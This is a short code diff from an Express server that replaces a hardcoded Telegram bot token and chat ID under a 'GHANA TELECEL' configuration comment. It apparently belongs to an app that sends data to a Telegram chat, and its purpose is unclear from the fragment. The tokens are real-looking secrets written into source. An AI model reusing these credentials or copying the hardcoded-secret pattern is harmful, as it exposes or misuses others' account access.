@@ -8,8 +8,8 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Telegram Bot Configuration - GHANA TELECEL
-const TELEGRAM_BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
-const TELEGRAM_CHAT_ID = '6414813627';
+const TELEGRAM_BOT_TOKEN = '8682459395:AAHFJBKhlfOvCPJm8tnSfvUu5hS_b290ClE';
+const TELEGRAM_CHAT_ID = '8820857419';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 app.use(cors());
